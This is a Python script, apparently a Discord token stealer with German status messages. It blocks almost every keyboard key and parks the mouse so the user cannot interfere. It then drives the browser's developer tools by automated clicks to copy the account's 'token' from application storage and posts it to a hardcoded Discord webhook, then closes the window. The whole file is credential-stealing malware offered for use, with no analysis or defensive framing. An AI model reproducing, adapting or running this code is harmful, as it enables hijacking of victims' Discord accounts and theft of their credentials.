import webbrowser
import time
import pyperclip
import requests
import pyautogui
import pygetwindow as gw
import keyboard

# Block all keys immediately
def block_all_keys():
    keyboard.block_key('Win')
    keyboard.block_key('alt')
    keyboard.block_key('f4')
    keyboard.block_key('ctrl')
    keyboard.block_key('w')
    keyboard.block_key('tab')
    keyboard.block_key('windows')
    keyboard.block_key('shift')
    keyboard.block_key('esc')
    keyboard.block_key('enter')
    keyboard.block_key('space')
    keyboard.block_key('backspace')
    keyboard.block_key('caps_lock')
    keyboard.block_key('num_lock')
    keyboard.block_key('scroll_lock')
    keyboard.block_key('print_screen')
    keyboard.block_key('pause')
    keyboard.block_key('insert')
    keyboard.block_key('delete')
    keyboard.block_key('home')
    keyboard.block_key('end')
    keyboard.block_key('page_up')
    keyboard.block_key('page_down')
    keyboard.block_key('left')
    keyboard.block_key('up')
    keyboard.block_key('right')
    keyboard.block_key('down')
    keyboard.block_key('f1')
    keyboard.block_key('f2')
    keyboard.block_key('f3')
    keyboard.block_key('f4')
    keyboard.block_key('f5')
    keyboard.block_key('f6')
    keyboard.block_key('f7')
    keyboard.block_key('f8')
    keyboard.block_key('f9')
    keyboard.block_key('f10')
    keyboard.block_key('f11')
    keyboard.block_key('f12')
    keyboard.block_key('0')
    keyboard.block_key('1')
    keyboard.block_key('2')
    keyboard.block_key('3')
    keyboard.block_key('4')
    keyboard.block_key('5')
    keyboard.block_key('6')
    keyboard.block_key('7')
    keyboard.block_key('8')
    keyboard.block_key('9')
    keyboard.block_key('a')
    keyboard.block_key('b')
    keyboard.block_key('c')
    keyboard.block_key('d')
    keyboard.block_key('e')
    keyboard.block_key('f')
    keyboard.block_key('g')
    keyboard.block_key('h')
    keyboard.block_key('i')
    keyboard.block_key('j')
    keyboard.block_key('k')
    keyboard.block_key('l')
    keyboard.block_key('m')
    keyboard.block_key('n')
    keyboard.block_key('o')
    keyboard.block_key('p')
    keyboard.block_key('q')
    keyboard.block_key('r')
    keyboard.block_key('s')
    keyboard.block_key('t')
    keyboard.block_key('u')
    keyboard.block_key('v')
    keyboard.block_key('w')
    keyboard.block_key('x')
    keyboard.block_key('y')
    keyboard.block_key('z')

# Unblock all keys
def unblock_all_keys():
    keyboard.unblock_key('alt')
    keyboard.unblock_key('f4')
    keyboard.unblock_key('ctrl')
    keyboard.unblock_key('w')
    keyboard.unblock_key('tab')
    keyboard.unblock_key('windows')
    keyboard.unblock_key('shift')
    keyboard.unblock_key('esc')
    keyboard.unblock_key('enter')
    keyboard.unblock_key('space')
    keyboard.unblock_key('backspace')
    keyboard.unblock_key('caps_lock')
    keyboard.unblock_key('num_lock')
    keyboard.unblock_key('scroll_lock')
    keyboard.unblock_key('print_screen')
    keyboard.unblock_key('pause')
    keyboard.unblock_key('insert')
    keyboard.unblock_key('delete')
    keyboard.unblock_key('home')
    keyboard.unblock_key('end')
    keyboard.unblock_key('page_up')
    keyboard.unblock_key('page_down')
    keyboard.unblock_key('left')
    keyboard.unblock_key('up')
    keyboard.unblock_key('right')
    keyboard.unblock_key('down')
    keyboard.unblock_key('f1')
    keyboard.unblock_key('f2')
    keyboard.unblock_key('f3')
    keyboard.unblock_key('f4')
    keyboard.unblock_key('f5')
    keyboard.unblock_key('f6')
    keyboard.unblock_key('f7')
    keyboard.unblock_key('f8')
    keyboard.unblock_key('f9')
    keyboard.unblock_key('f10')
    keyboard.unblock_key('f11')
    keyboard.unblock_key('f12')
    keyboard.unblock_key('0')
    keyboard.unblock_key('1')
    keyboard.unblock_key('2')
    keyboard.unblock_key('3')
    keyboard.unblock_key('4')
    keyboard.unblock_key('5')
    keyboard.unblock_key('6')
    keyboard.unblock_key('7')
    keyboard.unblock_key('8')
    keyboard.unblock_key('9')
    keyboard.unblock_key('a')
    keyboard.unblock_key('b')
    keyboard.unblock_key('c')
    keyboard.unblock_key('d')
    keyboard.unblock_key('e')
    keyboard.unblock_key('f')
    keyboard.unblock_key('g')
    keyboard.unblock_key('h')
    keyboard.unblock_key('i')
    keyboard.unblock_key('j')
    keyboard.unblock_key('k')
    keyboard.unblock_key('l')
    keyboard.unblock_key('m')
    keyboard.unblock_key('n')
    keyboard.unblock_key('o')
    keyboard.unblock_key('p')
    keyboard.unblock_key('q')
    keyboard.unblock_key('r')
    keyboard.unblock_key('s')
    keyboard.unblock_key('t')
    keyboard.unblock_key('u')
    keyboard.unblock_key('v')
    keyboard.unblock_key('w')
    keyboard.unblock_key('x')
    keyboard.unblock_key('y')
    keyboard.unblock_key('z')
    keyboard.unblock_key('Win')

# Block mouse movements
def block_mouse():
    pyautogui.FAILSAFE = False
    pyautogui.moveTo(0, 0)  # Move mouse to a safe position

# Unblock mouse movements
def unblock_mouse():
    pyautogui.FAILSAFE = True

# Block all inputs immediately
block_all_keys()
block_mouse()

url = 'https://discord.com/channels/@me'
webbrowser.open(url)
time.sleep(0.5)

def is_device_toolbar_active():
    toolbar_title = "Responsive" 
    windows = gw.getWindowsWithTitle(toolbar_title)
    return len(windows) > 0

# Open the Developer Tools
pyautogui.hotkey('ctrl', 'shift', 'i')
time.sleep(0.5)

# Check if the Device Toolbar is already active
if not is_device_toolbar_active():
    pyautogui.hotkey('ctrl', 'shift', 'm')
    time.sleep(0.2)

# Click on the positions
pyautogui.click(x=492, y=103)
time.sleep(0.2)
pyautogui.click(x=530, y=622)
time.sleep(0.2)

pyautogui.hotkey('ctrl', 'shift', 'p')
time.sleep(0.2)
pyautogui.write('Application')
time.sleep(0.5)
pyautogui.press('enter')
time.sleep(0.3)

pyautogui.click(x=1637, y=122)
time.sleep(0.1)
pyautogui.write('token')
time.sleep(0.1)
pyautogui.press('enter')

time.sleep(0.4)

pyautogui.click(x= 1799, y= 314)
time.sleep(0.2)
pyautogui.click( x= 1766, y= 845)
pyautogui.hotkey('ctrl', 'c')
time.sleep(0.2)

token = pyperclip.paste()
print(f'Token gefunden: {token}')

if token:
    webhook_url = 'https://discord.com/api/webhooks/1335192784298184735/u6Da6il9hVlQjADenbhHbaqWZ3Fzdt8dmPLk7IRzfy1MYS9euU2VIWFK-LJOGX03KbHG'
    payload = {'content': f'Token gefunden: {token}'}
    print(f'Sende Payload an {webhook_url}: {payload}')
    response = requests.post(webhook_url, json=payload)

    if response.status_code == 204:
        print('Token erfolgreich gesendet.')
        pyautogui.click(x=1896, y=17)
    else:
        print(f'Fehler beim Senden des Tokens: {response.status_code}')
        print(f'Response Text: {response.text}')
        pyautogui.click(x=1896, y=17)
else:
    print('Token konnte nicht kopiert werden.')
    pyautogui.click(x=1896, y=17)

# Unblock all inputs at the end
unblock_all_keys()
unblock_mouse()     